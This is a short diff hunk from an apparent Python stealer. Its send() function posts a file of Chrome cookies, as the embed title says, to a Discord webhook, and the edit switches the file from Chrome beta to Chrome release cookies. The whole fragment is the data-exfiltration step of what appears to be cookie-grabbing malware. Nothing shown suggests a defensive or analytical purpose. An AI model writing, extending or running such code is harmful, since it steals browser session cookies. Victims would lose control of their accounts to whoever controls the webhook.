@@ -76,7 +76,7 @@ async def send():
         elif cr_exists:
             wr = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
             er = discord.Embed(title="Chrome Cookies", description="")
-            await wr.send(file=chrome_beta, embed=er)
+            await wr.send(file=chrome_release, embed=er)
         await w.send(embed=e)
 
 
